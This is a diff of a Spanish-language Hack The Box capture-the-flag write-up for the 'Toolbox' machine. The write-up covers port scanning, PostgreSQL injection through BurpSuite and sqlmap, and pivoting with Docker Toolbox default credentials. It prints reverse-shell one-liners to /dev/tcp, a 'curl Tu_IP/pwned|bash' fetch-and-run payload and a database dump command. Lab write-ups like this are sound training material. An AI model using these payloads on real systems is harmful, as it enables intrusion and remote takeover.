@@ -1,7 +1,7 @@
 ---
 layout: single
 title: Toolbox - Hack The Box
-excerpt: "Esta fue una máquina, un poquito complicada, vamos a analizar varios servicios que tiene activo, siendo que el puerto HTTP será la clave para resolver la máquina, pues podremos aplicar PostgreSQL Injection de dos formas, con BurpSuite y con SQLMAP para obtener una Shell de manera remota. Una vez dentro, descubrimos que estamos en una aplicación de varias, gracias a la herramienta Docker Toolbox que está usando, nos conectamos a la primera aplicación usando credenciales por defecto de esta herramienta y nos conectamos a una aplicación que copia todo el contenido de la máquina."
+excerpt: "Esta fue una máquina, un poquito complicada, vamos a analizar varios servicios que tiene activo, siendo que el servicio HTTPS será la clave para resolver la máquina, pues podremos aplicar PostgreSQL Injection de dos formas, con BurpSuite y con SQLMAP para obtener una Shell de manera remota. Una vez dentro, descubrimos que estamos en una aplicación de varias, gracias a la herramienta Docker Toolbox que está usando, nos conectamos a la primera aplicación usando credenciales por defecto de esta herramienta y nos conectamos a una aplicación que copia todo el contenido de la máquina."
 date: 2023-05-19
 classes: wide
 header:
@@ -13,20 +13,36 @@ categories:
   - Easy Machine
 tags:
   - Windows
-  - Docker Toolbox
   - Linux
-  - PostgreSQL Pentesting
+  - Docker Toolbox
   - PostgreSQL Injection
-  - Remote Code Execution - RCE
+  - Remote Code Execution (RCE)
   - BurpSuite
-  - SQLMAP
   - Pivoting
   - Default Credentials
   - OSCP Style
 ---
 ![](/assets/images/htb-writeup-toolbox/toolbox_logo.png)
 
-Esta fue una máquina, un poquito complicada, vamos a analizar varios servicios que tiene activo, siendo que el puerto **HTTP** será la clave para resolver la máquina, pues podremos aplicar **PostgreSQL Injection** de dos formas, con **BurpSuite** y con **SQLMAP** para obtener una **Shell** de manera remota. Una vez dentro, descubrimos que estamos en una aplicación de varias, gracias a la herramienta **Docker Toolbox** que está usando, nos conectamos a la primera aplicación usando credenciales por defecto de esta herramienta y nos conectamos a una aplicación que copia todo el contenido de la máquina.
+Esta fue una máquina, un poquito complicada, vamos a analizar varios servicios que tiene activo, siendo que el servicio **HTTPS** será la clave para resolver la máquina, pues podremos aplicar **PostgreSQL Injection** de dos formas, con **BurpSuite** y con **SQLMAP** para obtener una **Shell** de manera remota. Una vez dentro, descubrimos que estamos en una aplicación de varias, gracias a la herramienta **Docker Toolbox** que está usando, nos conectamos a la primera aplicación usando credenciales por defecto de esta herramienta y nos conectamos a una aplicación que copia todo el contenido de la máquina.
+
+Herramientas utilizadas:
+* *nmap*
+* *ftp*
+* *smbclient*
+* *crackmapexec*
+* *openssl*
+* *wappalizer*
+* *wfuzz*
+* *gobuster*
+* *burpsuite*
+* *postgresql*
+* *bash*
+* *curl*
+* *python3*
+* *nc*
+* *sqlmap*
+* *ssh*
 
 
 <br>
@@ -42,13 +58,14 @@ Esta fue una máquina, un poquito complicada, vamos a analizar varios servicios 
 			</ul>
 		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
 			<ul>
-				<li><a href="#Servicios">Enumeración de Servicios FTP, SMB y Análisis de Certificado HTTPS</a></li>
+				<li><a href="#Servicios2">Enumeración de Servicios FTP, SMB y Análisis de Certificado HTTPS</a></li>
 				<ul>
 					<li><a href="#FTP">Enumeración Servicio FTP</a></li>
 					<li><a href="#SMB">Enumeración Servicio SMB</a></li>
 					<li><a href="#OpenSSL">Análisis de Certificado HTTPS</a></li>
 				</ul>
-				<li><a href="#HTTPS">Analizando Puerto 80</a></li>
+				<li><a href="#HTTPS">Analizando Servicio HTTPS</a></li>
+				<li><a href="#Fuzz">Fuzzing</a></li>
 				<li><a href="#Burp">Probando Vulnerabilidades con BurpSuite</a></li>
 			</ul>
 		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
@@ -58,7 +75,7 @@ Esta fue una máquina, un poquito complicada, vamos a analizar varios servicios 
 			</ul>
 		<li><a href="#Post">Post Explotación</a></li>
 			<ul>
-				<li><a href="#Docker">Pivoting a Aplicación de Docker</a></li>
+				<li><a href="#Docker">Pivoting a Aplicación de Docker y Enumeración de Máquina</a></li>
 				<li><a href="#Windows">Utilizando Llave Privada para Conectarnos a Windows por SSH</a></li>
 			</ul>
 		<li><a href="#Links">Links de Investigación</a></li>
@@ -70,17 +87,15 @@ Esta fue una máquina, un poquito complicada, vamos a analizar varios servicios 
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
 </div>
 <br>
 
 
 <h2 id="Ping">Traza ICMP</h2>
+
 Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
-```
+```bash
 ping -c 4 10.10.10.236                                        
 PING 10.10.10.236 (10.10.10.236) 56(84) bytes of data.
 64 bytes from 10.10.10.236: icmp_seq=1 ttl=127 time=150 ms
@@ -95,7 +110,8 @@ rtt min/avg/max/mdev = 142.246/144.532/150.337/3.358 ms
 Por el TTL sabemos que la máquina usa Windows, hagamos los escaneos de puertos y servicios.
 
 <h2 id="Puertos">Escaneo de Puertos</h2>
-```
+
+```bash
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.236 -oG allPorts
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-19 14:34 CST
@@ -139,19 +155,23 @@ Read data files from: /usr/bin/../share/nmap
 Nmap done: 1 IP address (1 host up) scanned in 32.19 seconds
            Raw packets sent: 158419 (6.970MB) | Rcvd: 64760 (2.590MB)
 ```
-* -p-: Para indicarle un escaneo en ciertos puertos.
-* --open: Para indicar que aplique el escaneo en los puertos abiertos.
-* -sS: Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.
-* --min-rate: Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).
-* -vvv: Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.
-* -n: Para indicar que no se aplique resolución dns para agilizar el escaneo.
-* -Pn: Para indicar que se omita el descubrimiento de hosts.
-* -oG: Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.
+
+| Parámetros | Descripción |
+|--------------------------|
+| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
+| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
+| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
+| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
+| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
+| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
+| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
+| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |
 
 Vaya, hay muchos puertos abiertos, aunque me da un poco de curiosidad como es que hay un puerto SSH activo en una máquina Windows, veamos que nos dice el escaneo de servicios.
 
 <h2 id="Servicios">Escaneo de Servicios</h2>
-```
+
+```bash
 nmap -sC -sV -p21,22,135,139,443,445,5985,47001,49664,49666,49667,49668,49669 10.10.10.236 -oN targeted
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-19 14:36 CST
 Nmap scan report for 10.10.10.236
@@ -205,31 +225,36 @@ Host script results:
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 69.09 seconds
 ```
-* -sC: Para indicar un lanzamiento de scripts básicos de reconocimiento.
-* -sV: Para identificar los servicios/versión que están activos en los puertos que se analicen.
-* -p: Para indicar puertos específicos.
-* -oN: Para indicar que el output se guarde en un fichero. Lo llame targeted.
+
+| Parámetros | Descripción |
+|--------------------------|
+| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
+| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
+| *-p*       | Para indicar puertos específicos. |
+| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |
 
 Veo que el servicio **FTP** tiene activo el login **anonymous** y veo Samba también, además de una página web en el puerto 443. Primero, vamos a revisar el servicio **FTP** y luego la página web.
+
 
 <br>
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
 </div>
 <br>
 
 
-<h2 id="Servicios">Enumeración de Servicios FTP, SMB y Análisis de Certificado HTTPS</h2>
+<h2 id="Servicios2">Enumeración de Servicios FTP, SMB y Análisis de Certificado HTTPS</h2>
+
+Vamos a enunerar estos servicios para ver que encontramos, aunque es posible que no encontremos nada.
+
+<br>
 
 <h3 id="FTP">Enumeración Servicio FTP</h3>
 
 Entremos:
-```
+```bash
 ftp 10.10.10.236
 Connected to 10.10.10.236.
 220-FileZilla Server 0.9.60 beta
@@ -243,38 +268,60 @@ Remote system type is UNIX.
 Using binary mode to transfer files.
 ftp>
 ```
-Aun así, el escaneo de servicios, indica que hay un archivo llamado **docker-toolbox.exe**. Puedes verlo en el **FTP**:
-```
+
+Aun así, el escaneo de servicios, indica que hay un archivo llamado **docker-toolbox.exe**.
+
+Puedes verlo en el **FTP**:
+```bash
 ftp> ls
 229 Entering Extended Passive Mode (|||58609|)
 150 Opening data channel for directory listing of "/"
 -r-xr-xr-x 1 ftp ftp      242520560 Feb 18  2020 docker-toolbox.exe
 226 Successfully transferred "/"
 ```
-Podemos tratar de descargarlo como binario, porque si no tardara mucho en descargar y puede que con errores. Pero aun así, tardara demasiado, por lo que no lo descargaremos, vamos a investigar que es eso de **docker-toolbox.exe**:
+Podemos tratar de descargarlo como binario, porque si no tardara mucho en descargar y puede que con errores. Pero tardara demasiado por lo que no lo descargaremos, vamos a investigar que es eso de **docker-toolbox.exe**:
 
-**Docker Toolbox proporciona una forma de utilizar Docker en sistemas Windows antiguos que no cumplen con los requisitos mínimos del sistema para la aplicación Docker para Windows. El componente principal de Docker requiere un sistema operativo Linux para poderse ejecutar.**
+| **Docker Toolbox** |
+|:-----------:|
+| *Docker Toolbox proporciona una forma de utilizar Docker en sistemas Windows antiguos que no cumplen con los requisitos mínimos del sistema para la aplicación Docker para Windows. El componente principal de Docker requiere un sistema operativo Linux para poderse ejecutar.* |
 
-Entonces, por eso tiene un puerto **SSH** activo, de momento, no veo nada más.
+<br>
+
+Entonces, por eso tiene un puerto **SSH** activo pues ahí esta activo el **Docker Toolbox**.
+
+De momento no veo nada más.
+
+<br>
 
 <h3 id="SMB">Enumeración Servicio SMB</h3>
 
 Veamos si podemos enumerar archivos compartidos del servicio **SMB**:
-```
+```bash
 smbclient -L 10.10.10.236 -N                                                                                 
 session setup failed: NT_STATUS_ACCESS_DENIED
 ```
-Nada, incluso, puedes checar si el servicio esta activo:
-```
+
+Nada, vamos a checar si el servicio esta activo con **crackmapexec**:
+```bash
 crackmapexec smb 10.10.10.236                                             
 SMB  10.10.10.236    445    TOOLBOX   [*] Windows 10.0 Build 17763 x64 (name:TOOLBOX) (domain:Toolbox) (signing:False) (SMBv1:False)
 ```
 Pues no, no podremos hacer nada por ahí.
 
+<br>
+
 <h3 id="OpenSSL">Análisis de Certificado HTTPS</h3>
 
-Entonces, ya por último, vamos a ver qué información podemos obtener del certificado de HTTPS con la herramienta **openssl**:
-```
+En el escaneo de **Nmap** nos reporto que la máquina tiene activo el puerto 443 y que tiene un certificado SSL activo para **admin.megalogistic.com**, probemos la herramienta **openssl** para ver que información podemos obtener de este certificado.
+
+| **Toolkit OpenSSL** |
+|:-----------:|
+| *OpenSSL es un "toolkit" para los protocoles Transporte Seguro de Capas (Transport Layer Security - TLS) y los enchufes seguros de capas (Secure Sockets Layer - SSL). También es una librería de propósitos generales de criptografía. Es usado para asegurar las conexiones en un servidor dentro de tu software.* |
+
+<br>
+
+Probemosla:
+```bash
 openssl s_client -connect 10.10.10.236:443
 CONNECTED(00000003)
 Can't use SSL_get_servername
@@ -304,7 +351,9 @@ Server certificate
 ```
 Podemos ver dos dominios, **megalogistic.com** y **admin.megalogistic.com**. Quiero suponer que la IP nos llevara a cualquiera de las dos, así que vamos a analizar la página web.
 
-<h2 id="HTTPS">Analizando Puerto 80</h2>
+Podemos ver que nos reporto un dominio **admin.megalogistic.com**, que es el mismo que nos dio **Nmap**, podemos entrar primero a la IP a ver que nos reporta y si no vemos nada, ya registramos el dominio en el **etc/hosts**.
+
+<h2 id="HTTPS">Analizando Servicio HTTPS</h2>
 
 Entremos.
 
@@ -325,7 +374,7 @@ Bien, veamos que nos dice el **Wappalizer**:
 </p>
 
 Te diría que buscaras algo útil en la página, pero de una vez te digo que no hay nada. Tratemos de entrar al dominio **admin.megalogistic.com**, pero si tratamos de entrar, no saldrá nada, por lo que vamos a registrar este dominio en el **/etc/hosts**:
-```
+```bash
 nano /etc/host
 
 10.10.10.236 admin.megalogistic.com
@@ -340,15 +389,95 @@ Ahora, vuelve a cargar la página y ya debería verse:
 <img src="/assets/images/htb-writeup-toolbox/Captura5.png">
 </p>
 
-Bien, aparece un login, te diría que trates de adivinar la contraseña, pero no podrás, sin embargo, podemos aplicar **SQL Injection** solamente poniendo una comilla en usuario y contraseña:
+Bien, aparece un login, te diría que trates de adivinar la contraseña, pero no podrás.
+
+Veamos si no hay alguna otra página aplicando **Fuzzing**.
+
+<h2 id ="Fuzz">Fuzzing</h2>
+
+```bash
+wfuzz -u https://10.10.10.236 -H "Host: FUZZ.megalogistic.com" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --hh 22357 --hc=400,404
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: https://10.10.10.236/
+Total requests: 220546
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                   
+=====================================================================
+
+000000245:   200        35 L     83 W       889 Ch      "admin"                                                                                                                                                                   
+000006084:   200        35 L     83 W       889 Ch      "Admin"                                                                                                                                                                   
+
+Total time: 0
+Processed Requests: 138331
+Filtered Requests: 138329
+Requests/sec.: 0
+```
+
+| Parámetros | Descripción |
+|--------------------------|
+| *-c*       | Para ver el resultado en un formato colorido. |
+| *--hc*     | Para no mostrar un código de estado en los resultados. |
+| *-t*       | Para indicar la cantidad de hilos a usar. |
+| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
+
+<br>
+
+Ahora probemos con **gobuster**:
+```bash
+gobuster dir -u https://10.10.10.236/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 30 -k --no-error
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     https://10.10.10.236/
+[+] Method:                  GET
+[+] Threads:                 30
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.5
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/images               (Status: 301) [Size: 315] [--> https://10.10.10.236/images/]
+/css                  (Status: 301) [Size: 312] [--> https://10.10.10.236/css/]
+/js                   (Status: 301) [Size: 311] [--> https://10.10.10.236/js/]
+/fonts                (Status: 301) [Size: 314] [--> https://10.10.10.236/fonts/]
+/server-status        (Status: 403) [Size: 278]
+Progress: 220462 / 220547 (99.96%)
+===============================================================
+Finished
+===============================================================
+```
+
+| Parámetros | Descripción |
+|--------------------------|
+| *-u*       | Para indicar la URL a utilizar. |
+| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
+| *-t*       | Para indicar la cantidad de hilos a usar. |
+| *-k*       | Para indicar que se deshabilite la comprobación de certificados |
+| *--no-error* | Para indicar que no muestre los errores. |
+
+<br>
+
+No pues no encontro nada.
+
+<h2 id="Burp">Probando Vulnerabilidades con BurpSuite</h2>
+
+Vamos a probar si el login es vulnerable a **SQL Injection**, solamente poniendo una comilla en usuario y contraseña:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-toolbox/Captura6.png">
 </p>
 
-Vaya, vaya, mira que nos enfrentamos a **postgresql** por las siglas **pg**. Vamos a utilizar **BurpSuite** para analizar si se puede hacer **PostgreSQL Injection**.
+Excelente, nos enfrentamos a **postgresql** por las siglas **pg**. 
 
-<h2 id="Burp">Probando Vulnerabilidades con BurpSuite</h2>
+Vamos a utilizar **BurpSuite** para analizar si se puede hacer **PostgreSQL Injection**.
 
 Una vez que abras **BurpSuite**, captura el inicio del login con la comilla simple, debería verse así:
 
@@ -362,16 +491,15 @@ Ahora, mandalo al **Repeater** con **ctrl + r**:
 <img src="/assets/images/htb-writeup-toolbox/Captura8.png">
 </p>
 
-
 Si investigamos vulnerabilidades en **Postgresql**, encontramos que **Hacktricks** tiene algunas formas de ver si se pueden inyectar comandos:
 * https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection
 * https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql
 
 Entonces probemos primero, si es posible la inyección, vamos a mandar una petición que dure 10 segundos en devolver un resultado:
-```
+```sql
 ; select pg_sleep(10);-- -
 ```
-Esto lo vas a poner aún lado del dato, **username**, lanza la petición y debería tardar 10 segundos, si esto pasa, podemos inyectar comandos y si no, tendremos que hacerlo de otra forma:
+Esto lo vas a poner aún lado del dato  **username**, lanza la petición y debería tardar 10 segundos, si esto pasa, podemos inyectar comandos y si no, tendremos que hacerlo de otra forma:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-toolbox/Captura9.png">
@@ -388,10 +516,7 @@ Si funciona, utilizaremos esta vulnerabilidad para conectarnos al usuario de man
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
 </div>
 <br>
 
@@ -400,10 +525,12 @@ Existen dos formas de ganar acceso a la máquina de manera remota como usuario, 
 
 <h2 id="Burp2">Conectandonos de Manera Remota con BurpSuite</h2>
 
-De acuerdo con **Hacktricks**, hay una forma de conectarnos de manera remota a la máquina, creando una tabla que va a ejecutar una shell, hagámoslo por pasos:
+De acuerdo con **Hacktricks**, hay una forma de conectarnos de manera remota a la máquina, creando una tabla que va a ejecutar una shell.
+
+Hagámoslo por pasos:
 
 * Crearemos primero la tabla que creara la shell para conectarnos de la misma forma en la que hicimos la petición anterior, utilizando el siguiente código:
-```
+```sql
 CREATE TABLE cmd_exec(cmd_output text);
 ```
 Bien, ahora en vez de URL encodearla, elimina los espacios y pon en su lugar el signo **+**, cuando mandes la petición, no debería mostrar ningún error, en caso de que diga que la tabla existe, usa el código de **Hacktricks** para eliminar esa tabla:
@@ -416,24 +543,29 @@ Bien, ahora en vez de URL encodearla, elimina los espacios y pon en su lugar el 
 <img src="/assets/images/htb-writeup-toolbox/Captura12.png">
 </p>
 
-* Analizando un poco, sabemos que la máquina está usando Windows y Linux a la vez, utilizando un **Docker**, lo que podemos hacer, es conectarnos usando un archivo en **Bash** que llame a una **cmd** de la máquina víctima hacia la nuestra, a traves de la petición que hacemos en **BurpSuite**, que recordemos, puede ejecutar comandos. Crea un archivo que tenga una **Reverse Shell** en **Bash**:
-```
+Analizando un poco, sabemos que la máquina está usando **Windows y Linux** a la vez utilizando un **Docker**, lo que podemos hacer es conectarnos usando un archivo en **Bash** que llame a una **cmd** de la máquina víctima hacia la nuestra a traves de la petición que hacemos en **BurpSuite**, que recordemos, puede ejecutar comandos. 
+
+* Crea un archivo que tenga una **Reverse Shell** en **Bash**:
+```bash
 nano pwned
 #!/bin/bash
 bash -i >& /dev/tcp/Tu_IP/443 0>&1
 ```
-* Abre un servidor en Python en donde tengas este archivo:
-```
+
+* Abre un servidor en **Python** en donde tengas este archivo:
+```bash
 python3 -m http.server 80                                     
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
+
 * En **BurpSuite**, usaremos **curl** para abrir ese archivo y ejecutarlo con **Bash**, utiliza el código que proporciona **Hacktricks**:
-```
+```sql
 COPY cmd_exec FROM PROGRAM 'id';
 ```
-Elimina **id** y pon la siguiente línea:
-```
-'curl+10.10.14.10/pwned|bash'
+
+* Elimina **id** y pon la siguiente línea:
+```sql
+'curl+Tu_IP/pwned|bash'
 ```
 Y debería verse así:
 
@@ -441,33 +573,35 @@ Y debería verse así:
 <img src="/assets/images/htb-writeup-toolbox/Captura13.png">
 </p>
 
-* Abre una netcat:
-```
+* Abre una **netcat**:
+```bash
 nc -nvlp 443                                                  
 listening on [any] 443 ...
 ```
-* Manda la petición y observa la netcat:
+
+* Manda la petición y observa la **netcat**:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-toolbox/Captura14.png">
 </p>
 
-```
+```bash
 nc -nvlp 443                                                  
 listening on [any] 443 ...
-connect to [10.10.14.10] from (UNKNOWN) [10.10.10.236] 50059
+connect to [Tu_IP] from (UNKNOWN) [10.10.10.236] 50059
 bash: cannot set terminal process group (4101): Inappropriate ioctl for device
 bash: no job control in this shell
 postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ whoami
 whoami
 postgres
 ```
-Excelente, puedes obtener una shell interactiva, pero debo advertirte que obtener la shell de esta forma, es algo inestable y puede desconectarse mandando a la mierda todo, por lo que yo recomiendo la segunda forma, por ser más estable.
+
+Excelente, puedes obtener una shell interactiva, pero debo advertirte que conectarte a la máquina víctima de esta forma es algo inestable y puede desconectarse, por lo que yo recomiendo la segunda forma por ser más estable.
 
 <h2 id="SQL">Conectandonos de Manera Remota con SQLMAP</h2>
 
 Para utilizar **SQLMAP**, necesitamos la petición web que podemos copiar de **BurpSuite**, así que vamos a usar la primera petición, pero vas a cambiar la comilla simple por **admin** porque si no la petición por **SQLMAP** fallara:
-```
+```html
 POST / HTTP/1.1
 Host: admin.megalogistic.com
 Cookie: PHPSESSID=4721807843bbe54fe5b1d3dde0f6855d
@@ -489,8 +623,9 @@ Connection: close
 
 username=admin&password=admin
 ```
+
 Ahora, usa este archivo con **SQLMAP** para ver si podemos obtener información de las bases de datos de la página web:
-```
+```bash
 sqlmap -r request.txt --dbs --force-ssl --batch
        __H__                                                                                                                           
  ___ ___[)]_____ ___ ___  {1.7.2#stable}                                                                                               
@@ -520,8 +655,9 @@ available databases [3]:
 
 [*] ending @ 20:59:00 /2023-05-19/
 ```
+
 Hay 3 bases de datos, para que no pierdas tiempo, vamos a ver la base de datos **public** y verás algo interesante en su contenido:
-```
+```bash
 sqlmap -r request.txt --dbs --force-ssl --batch -D public --dump-all
        __H__                                                                                                                           
  ___ ___[.]_____ ___ ___  {1.7.2#stable}                                                                                               
@@ -544,8 +680,9 @@ Table: users
 | 4a100a85cb5ca3616dcf137918550815 | admin    |
 +----------------------------------+----------+
 ```
-Tenemos un usuario y contraseña, cambia eso en el archivo que creaste de la petición y con **SQLMAP**, vamos a obtener una shell temporal para ver si podemos ejecutar comandos:
-```
+
+Tenemos un usuario y contraseña, agrega esas credenciales en sus respectivos parámetros del la petición que guardaste y con **SQLMAP**, vamos a obtener una shell temporal para ver si podemos ejecutar comandos:
+```bash
 sqlmap -r request.txt --force-ssl --batch --os-shell           
        __H__                                                                                                                           
  ___ ___[']_____ ___ ___  {1.7.2#stable}                                                                                               
@@ -565,28 +702,30 @@ do you want to retrieve the command standard output? [Y/n/a] Y
 command standard output: 'postgres'
 os-shell>
 ```
-Excelente, podemos usar comandos, ya solo conéctate de manera remota con el mismo código de la **Reverse Shell**, obviamente, abre una netcat:
-```
+
+Excelente, podemos usar comandos, ya solo conéctate de manera remota con el mismo código de la **Reverse Shell**, obviamente, abre una **netcat**:
+```bash
 [21:05:02] [INFO] retrieved: 'postgres'
 command standard output: 'postgres'
-os-shell> bash -c 'bash -i >& /dev/tcp/10.10.14.10/443 0>&1'
+os-shell> bash -c 'bash -i >& /dev/tcp/Tu_IP/443 0>&1'
 do you want to retrieve the command standard output? [Y/n/a] Y
 ```
-Mira la netcat:
-```
+
+Mira la **netcat**:
+```bash
 nc -nvlp 443
 listening on [any] 443 ...
-connect to [10.10.14.10] from (UNKNOWN) [10.10.10.236] 50373
+connect to [Tu_IP] from (UNKNOWN) [10.10.10.236] 50373
 bash: cannot set terminal process group (4639): Inappropriate ioctl for device
 bash: no job control in this shell
 postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ whoami
 whoami
 postgres
 ```
-Obtén una shell interactiva con Python o Bash.
+Obtén una shell interactiva con **Python** o **Bash**.
 
 La flag del usuario, está en el directorio **postgres**:
-```
+```bash
 ostgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ cd ~
 postgres@bc56e3cc55e9:/var/lib/postgresql$ ls
 11  user.txt
@@ -599,18 +738,15 @@ postgres@bc56e3cc55e9:/var/lib/postgresql$ cat user.txt
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Post" style="text-align:center;">Post Explotación</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Post" style="text-align:center;">Post Explotación</h1>
 </div>
 <br>
 
 
-<h2 id="Docker">Pivoting a Aplicación de Docker</h2>
+<h2 id="Docker">Pivoting a Aplicación de Docker y Enumeración de Máquina</h2>
 
 Enumerando un poco la máquina, no encontraremos mucho que podamos hacer. Si usamos el comando **ifconfig** veremos algo muy interesante:
-```
+```bash
 eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
         inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
         ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)
@@ -627,7 +763,8 @@ lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
         TX packets 8202  bytes 3090994 (2.9 MiB)
         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
 ```
-Observa la IP, debería terminar en 1, pero no es así. Si recordamos la herramienta que están usando es **Docker-toolbox.exe**, por lo que pueden tener varias aplicaciones web abiertas y si investigamos más sobre esta herramienta, encontraremos que tiene contraseñas por defecto:
+
+Observa la **IP**, debería terminar en 1, pero no es así. Si recordamos la herramienta que están usando es **Docker-toolbox.exe**, por lo que pueden tener varias aplicaciones web abiertas y si investigamos más sobre esta herramienta, encontraremos que tiene contraseñas por defecto:
 * https://stackoverflow.com/questions/32646952/docker-machine-boot2docker-root-password
 
 Ahí nos dicen que tiene las siguientes credenciales:
@@ -635,7 +772,7 @@ Ahí nos dicen que tiene las siguientes credenciales:
 * pwd: tcuser
 
 Vamos a usar estas credenciales para loguearnos al servicio **SSH** desde donde estamos:
-```
+```bash
 postgres@bc56e3cc55e9:/home/tony$ ssh docker@172.17.0.1
 docker@172.17.0.1's password: 
    ( '>')
@@ -645,8 +782,9 @@ docker@172.17.0.1's password:
 docker@box:~$ whoami
 docker
 ```
+
 Muy bien, si usamos el comando **ifconfig**, verás la diferencia de la aplicación en la que estamos:
-```
+```bash
 docker@box:~$ ifconfig                               
 docker0   Link encap:Ethernet  HWaddr 02:42:EB:C9:47:65  
           inet addr:172.17.0.1  Bcast:172.17.255.255  Mask:255.255.0.0
@@ -661,16 +799,17 @@ docker0   Link encap:Ethernet  HWaddr 02:42:EB:C9:47:65
 ...
 ...
 ```
-Puedes verificar tus privilegios y verás que podemos usar cualquier comando de Root:
-```
+
+Puedes verificar tus privilegios y verás que podemos usar cualquier comando de **Root**:
+```bash
 docker@box:~$ sudo -l                                
 User docker may run the following commands on this host:
     (root) NOPASSWD: ALL
 ```
-Entonces, quiero pensar que ya somos Root o estamos en la máquina principal de Windows, no lo sé, hay que enumerar un poco a ver que encontramos.
+Entonces, quiero pensar que ya somos **Root** o estamos en la máquina principal de **Windows**, no lo sé, hay que enumerar un poco a ver que encontramos.
 
 Enumerando la raíz, encontramos un directorio curioso, llamado **c**:
-```
+```bash
 docker@box:~$ cd /                                                             
 cd /
 docker@box:/$ ls                                                               
@@ -689,8 +828,9 @@ ls
 Administrator  Default        Public         desktop.ini
 All Users      Default User   Tony
 ```
+
 Hay un directorio llamado **Administrator**, veamos que contiene:
-```
+```bash
 docker@box:/c/Users$ cd Administrator                                          
 cd Administrator
 docker@box:/c/Users/Administrator$ ls -la                                      
@@ -712,21 +852,22 @@ dr-xr-xr-x    1 docker   staff            0 Apr  5  2021 Downloads
 dr-xr-xr-x    1 docker   staff            0 Feb 18  2020 Favorites
 dr-xr-xr-x    1 docker   staff            0 Feb 18  2020 Link
 ```
+
 Ok, veamos el directorio **Desktop**:
 ```
 docker@box:/c/Users/Administrator/Desktop$ ls                                  
 ls
 desktop.ini  root.txt
 docker@box:/c/Users/Administrator/Desktop$ cat root.txt                        
-.cat root.txt
+cat root.txt
 ...
 ```
-a...entonces, esto es lo mismo que la máquina Windows, es una copia por así decirlo. Podemos conectarnos a Windows, utilizando la llave privada SSH.
